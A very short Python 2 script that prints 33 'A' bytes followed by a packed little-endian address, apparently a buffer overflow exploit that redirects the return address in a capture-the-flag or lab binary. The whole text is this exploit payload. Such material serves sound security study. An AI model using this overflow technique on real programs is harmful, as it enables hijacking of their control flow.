#!/usr/bin/env python

import struct
print 'A'*33 + struct.pack('<I', 0x080485cb)
